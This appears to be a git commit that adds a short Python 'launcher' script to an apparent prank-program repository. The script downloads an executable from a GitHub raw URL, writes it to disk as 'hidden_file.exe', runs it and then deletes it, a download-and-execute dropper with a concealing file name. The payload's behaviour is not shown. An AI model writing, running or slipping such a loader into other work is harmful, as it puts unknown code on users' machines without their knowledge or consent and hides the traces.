84e04e4bb139c42e3f9068685a2a804d4a83deba
Ethan C <ethanjc@outlook.com>
2025-07-10 22:48:05 -0700

    added a more refined launcher

---
+++ launch_files/loader.py
@@ -0,0 +1,21 @@
+import requests,subprocess, os
+hidden_name = "hidden_file"
+filename = hidden_name+".exe"
+
+try:
+    os.remove(filename)
+except:
+    pass
+
+url_content = requests.get("https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/dist/main_script.exe")
+
+
+
+with open(filename, "wb") as file_write:
+    file_write.write(url_content.content)
+
+directory = os.path.abspath(filename)
+print(f"----> {directory}")
+subprocess.run([directory])
+os.remove(filename)
+
